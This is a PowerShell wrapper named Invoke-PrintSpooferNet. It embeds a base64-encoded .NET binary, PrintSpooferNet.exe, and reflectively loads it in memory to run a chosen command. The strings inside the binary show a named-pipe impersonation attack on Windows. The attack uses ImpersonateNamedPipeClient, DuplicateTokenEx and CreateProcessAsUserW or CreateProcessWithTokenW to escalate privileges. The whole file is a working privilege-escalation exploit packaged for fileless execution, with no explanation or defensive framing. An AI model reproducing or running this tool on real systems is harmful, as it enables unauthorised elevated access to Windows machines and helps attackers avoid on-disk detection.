function Invoke-PrintSpooferNet
{
    Param([string]$Pipe,[string]$Command, [string]$Method)
    if(-not($Pipe) -Or -not($Command) -Or -not($Method)) 
    { 
        Write-Host "Invalid number of args. Syntax: Invoke-PrintSpooferNet -Pipe '\\\\.\\pipe\\test\\pipe\\spoolss' -Command 'calc.exe' -Method <CreateProcessAsUserW, CreateProcessWithTokenW>"
	      Break Script
    }
    # Base64 modified PrintSpooferNet.exe 
    $PrintSpooferNetB64 = "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BQDoAQEAAAEHABAHAgBGAQkArwcCAEQBCwB8AAIAAAENAOQAAQBAAQ8ArQQCAEABEQDjBAIARgETABcBAgBAARUA0AMCAAABFwDTBwEAQAEZAC8EAwBEARsAlAACAASAAAABAAAAAAAAAAAAAAAAAPcGAAAEAAAAAAAAAAAAAABZALwAAAAAAAMAAgAEAAIABQACAAYAAgAHAAIACAACAAAAAAAAVG9JbnQzMgBjYlJlc2VydmVkMgBscFJlc2VydmVkMgA8TW9kdWxlPgBwU0lEAFNlcGFyYXRlV09XVkRNAFBST0NFU1NfSU5GT1JNQVRJT04AU1RBUlRVUElORk8AVE9LRU5fVVNFUgBTSURfQU5EX0FUVFJJQlVURVMAQ3JlYXRlUHJvY2Vzc1dpdGhUb2tlblcAQ3JlYXRlUHJvY2Vzc0FzVXNlclcAZHdYAGR3WQB2YWx1ZV9fAGNiAG1zY29ybGliAGR3VGhyZWFkSWQAZHdQcm9jZXNzSWQAaFRocmVhZABHZXRDdXJyZW50VGhyZWFkAFN1c3BlbmRlZABscE92ZXJsYXBwZWQAbHBSZXNlcnZlZABDb252ZXJ0U2lkVG9TdHJpbmdTaWQAcHRyU2lkAGR3UGlwZU1vZGUAZHdPcGVuTW9kZQBEZWZhdWx0RXJyb3JNb2RlAFRocmVhZEhhbmRsZQBUb2tlbkhhbmRsZQBXaXRoUHJvZmlsZQBOZXdDb25zb2xlAGxwVGl0bGUAZ2V0X05hbWUAbHBBcHBsaWNhdGlvbk5hbWUAbHBOYW1lAGxwQ29tbWFuZExpbmUAV3JpdGVMaW5lAENyZWF0ZU5hbWVkUGlwZQBoTmFtZWRQaXBlAENvbm5lY3ROYW1lZFBpcGUAVmFsdWVUeXBlAFRva2VuVHlwZQBHdWlkQXR0cmlidXRlAERlYnVnZ2FibGVBdHRyaWJ1dGUAQ29tVmlzaWJsZUF0dHJpYnV0ZQBBc3NlbWJseVRpdGxlQXR0cmlidXRlAEFzc2VtYmx5VHJhZGVtYXJrQXR0cmlidXRlAFRhcmdldEZyYW1ld29ya0F0dHJpYnV0ZQBkd0ZpbGxBdHRyaWJ1dGUAQXNzZW1ibHlGaWxlVmVyc2lvbkF0dHJpYnV0ZQBBc3NlbWJseUNvbmZpZ3VyYXRpb25BdHRyaWJ1dGUAQXNzZW1ibHlEZXNjcmlwdGlvbkF0dHJpYnV0ZQBDb21waWxhdGlvblJlbGF4YXRpb25zQXR0cmlidXRlAEFzc2VtYmx5UHJvZHVjdEF0dHJpYnV0ZQBBc3NlbWJseUNvcHlyaWdodEF0dHJpYnV0ZQBBc3NlbWJseUNvbXBhbnlBdHRyaWJ1dGUAUnVudGltZUNvbXBhdGliaWxpdHlBdHRyaWJ1dGUAUHJpbnRTcG9vZmVyTmV0LmV4ZQBkd1hTaXplAGR3WVNpemUAbkluQnVmZmVyU2l6ZQBuT3V0QnVmZmVyU2l6ZQB1U2l6ZQBTaXplT2YAUmV2ZXJ0VG9TZWxmAE9wZW5Bc1NlbGYAU3lzdGVtLlJ1bnRpbWUuVmVyc2lvbmluZwBUb1N0cmluZwBUb2tlbkluZm9ybWF0aW9uTGVuZ3RoAFJldHVybkxlbmd0aABDcmVhdGVFbnZpcm9ubWVudEJsb2NrAE1hcnNoYWwAU3lzdGVtLlNlY3VyaXR5LlByaW5jaXBhbABJbXBlcnNvbmF0aW9uTGV2ZWwAQWR2YXBpMzIuZGxsAGtlcm5lbDMyLmRsbAB1c2VyZW52LmRsbABTeXN0ZW0ARW51bQBPcGVuVGhyZWFkVG9rZW4AaEV4aXN0aW5nVG9rZW4AaFRva2VuAHBoTmV3VG9rZW4ATWFpbgBHZXRUb2tlbkluZm9ybWF0aW9uAGxwUHJvY2Vzc0luZm9ybWF0aW9uAFN5c3RlbS5SZWZsZWN0aW9uAGxwU3RhcnR1cEluZm8AWmVybwBscERlc2t0b3AATmV3UHJvY2Vzc0dyb3VwAFN0cmluZ0J1aWxkZXIAbHBCdWZmZXIAVXNlcgBHZXRMYXN0V2luMzJFcnJvcgBoU3RkRXJyb3IALmN0b3IASW50UHRyAFN5c3RlbS5EaWFnbm9zdGljcwBTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMAU3lzdGVtLlJ1bnRpbWUuQ29tcGlsZXJTZXJ2aWNlcwBuTWF4SW5zdGFuY2VzAERlYnVnZ2luZ01vZGVzAGJJbmhlcml0SGFuZGxlcwBscFRocmVhZEF0dHJpYnV0ZXMAbHBUb2tlbkF0dHJpYnV0ZXMAbHBQcm9jZXNzQXR0cmlidXRlcwBscFNlY3VyaXR5QXR0cmlidXRlcwBkd0xvZ29uRmxhZ3MAZHdDcmVhdGlvbkZsYWdzAGR3RmxhZ3MAYXJncwBTeXN0ZW0uU2VjdXJpdHkuQ2xhaW1zAGR3WENvdW50Q2hhcnMAZHdZQ291bnRDaGFycwBUb2tlbkluZm9ybWF0aW9uQ2xhc3MAZHdEZXNpcmVkQWNjZXNzAGhQcm9jZXNzAENvbmNhdABPYmplY3QAUHJpbnRTcG9vZmVyTmV0AGJJbmhlcml0AEltcGVyc29uYXRlTmFtZWRQaXBlQ2xpZW50AFVuaWNvZGVFbnZpcm9ubWVudABscEVudmlyb25tZW50AEdldEN1cnJlbnQARXh0ZW5kZWRTdGFydHVwSW5mb1ByZXNlbnQAbkRlZmF1bHRUaW1lT3V0AGhTdGRJbnB1dABoU3RkT3V0cHV0AFN5c3RlbS5UZXh0AHdTaG93V2luZG93AER1cGxpY2F0ZVRva2VuRXgATmV0Q3JlZGVudGlhbHNPbmx5AEdldFN5c3RlbURpcmVjdG9yeQBscEN1cnJlbnREaXJlY3RvcnkAb3BfRXF1YWxpdHkAQ2xhaW1zSWRlbnRpdHkAV2luZG93c0lkZW50aXR5AAAfVwBpAG4AUwB0AGEAMABcAEQAZQBmAGEAdQBsAHQAAIC/VQBzAGEAZwBlADoAIABQAHIAaQBuAHQAUwBwAG8AbwBmAGUAcgBOAGUAdAAuAGUAeABlACAAcABpAHAAZQBuAGEAbQBlACAAIgA8AEMAbwBtAG0AYQBuAGQAPgAiACAAPABDAHIAZQBhAHQAZQBQAHIAbwBjAGUAcwBzAEEAcwBVAHMAZQByAFcALAAgAEMAcgBlAGEAdABlAFAAcgBvAGMAZQBzAHMAVwBpAHQAaABUAG8AawBlAG4AVwA+AACAjUUAeABhAG0AcABsAGUAOgAgAEMAOgBcAFAAcgBpAG4AdABTAHAAbwBvAGYAZQByAE4AZQB0AC4AZQB4AGUAIABcAFwALgBcAHAAaQBwAGUAXAB0AGUAcwB0AFwAcABpAHAAZQBcAHMAcABvAG8AbABzAHMAIAAiAGMAYQBsAGMALgBlAHgAZQAiACAAAClDAHIAZQBhAHQAZQBQAHIAbwBjAGUAcwBzAEEAcwBVAHMAZQByAFcAAD1bACoAXQAgAFUAcwBpAG4AZwAgAEMAcgBlAGEAdABlAFAAcgBvAGMA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OAAIAAEAQQBzAHMAZQBtAGIAbAB5ACAAVgBlAHIAcwBpAG8AbgAAADEALgAwAC4AMAAuADAAAADsQwAA6gEAAAAAAAAAAAAA77u/PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiIHN0YW5kYWxvbmU9InllcyI/Pg0KDQo8YXNzZW1ibHkgeG1sbnM9InVybjpzY2hlbWFzLW1pY3Jvc29mdC1jb206YXNtLnYxIiBtYW5pZmVzdFZlcnNpb249IjEuMCI+DQogIDxhc3NlbWJseUlkZW50aXR5IHZlcnNpb249IjEuMC4wLjAiIG5hbWU9Ik15QXBwbGljYXRpb24uYXBwIi8+DQogIDx0cnVzdEluZm8geG1sbnM9InVybjpzY2hlbWFzLW1pY3Jvc29mdC1jb206YXNtLnYyIj4NCiAgICA8c2VjdXJpdHk+DQogICAgICA8cmVxdWVzdGVkUHJpdmlsZWdlcyB4bWxucz0idXJuOnNjaGVtYXMtbWljcm9zb2Z0LWNvbTphc20udjMiPg0KICAgICAgICA8cmVxdWVzdGVkRXhlY3V0aW9uTGV2ZWwgbGV2ZWw9ImFzSW52b2tlciIgdWlBY2Nlc3M9ImZhbHNlIi8+DQogICAgICA8L3JlcXVlc3RlZFByaXZpbGVnZXM+DQogICAgPC9zZWN1cml0eT4NCiAgPC90cnVzdEluZm8+DQo8L2Fzc2VtYmx5PgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=="
    $Stream=New-Object IO.MemoryStream(,[Convert]::FromBAsE64String($PrintSpooferNetB64))
    $output = New-Object System.IO.MemoryStream
    $Stream.CopyTo( $output )
    [byte[]] $byteOutArray = $output.ToArray()
    $RAS = [System.Reflection.Assembly]::Load($byteOutArray)
    $OldConsoleOut = [Console]::Out
    $StringWriter = New-Object IO.StringWriter
    [Console]::SetOut($StringWriter)
    $ExecInput = @($Pipe, $Command, $Method).split("")

    # Execute Binary 
    [PrintSpooferNet.PrintSpooferNet]::main($ExecInput)

    # Print Result 
    [Console]::SetOut($OldConsoleOut)
    $Results = $StringWriter.ToString()
    $Results
}
